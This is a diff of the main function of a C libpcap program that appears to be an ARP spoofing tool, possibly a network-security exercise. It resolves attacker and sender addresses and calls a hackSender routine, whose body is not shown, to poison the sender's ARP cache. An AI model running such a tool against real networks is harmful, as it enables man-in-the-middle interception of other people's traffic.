@@ -24,26 +24,21 @@ int main(int argc, char* argv[]) {
     return -1;
   }
 
-  uint8_t * src_ip = parseIP(argv[2]);
-  uint8_t * des_ip = parseIP(argv[3]);
-  printf("%u.%u.%u.%u", src_ip[0],src_ip[1],src_ip[2],src_ip[3]);
+  uint8_t * sender_ip = parseIP(argv[2]);
+  uint8_t * target_ip = parseIP(argv[3]);
+  printf("Sender ip : %s", printIPAddress(sender_ip));
+  printf("Target ip : %s", printIPAddress(target_ip));
 
-  uint8_t * router_ip = getRouterIPAddress();
-  printf("%u.%u.%u.%u", router_ip[0],router_ip[1],router_ip[2],router_ip[3]);
+  uint8_t * attaker_ip = parseIP(getAttackerIPAddress(dev));
+  printf("Attaker ip : %s\n", printIPAddress(attaker_ip));
 
-  u_char * sender_mac_address = getSenderMacAddress(dev);
-  char text1[30] = "Sender Mac Address : ";
-  printMacAddress(sender_mac_address, text1);
+  u_char * attacker_mac_address = getAttackerMacAddress(dev);
+  printf("Attacker Mac Address : %s", printMacAddress(attacker_mac_address));
 
-  u_char * router_mac_address = getTargetMacAddress(handle, sender_mac_address, src_ip, router_ip);
-  char text2[30] = "Router Mac Address : ";
-  printMacAddress(router_mac_address, text2);
+  u_char * sender_mac_address = getSenderMacAddress(handle, attacker_mac_address, attaker_ip, sender_ip);
+  printf("Sender Mac Address : %s", printMacAddress(sender_mac_address));
 
-  u_char * target_mac_address = getTargetMacAddress(handle, sender_mac_address, src_ip, des_ip);
-  char text3[30] = "Target Mac Address : ";
-  printMacAddress(target_mac_address, text3);
-
-  hackTarget(handle, sender_mac_address, target_mac_address, router_ip, des_ip);
+  hackSender(handle, attacker_mac_address, sender_mac_address, target_ip, sender_ip);
 
   pcap_close(handle);
   return 0;
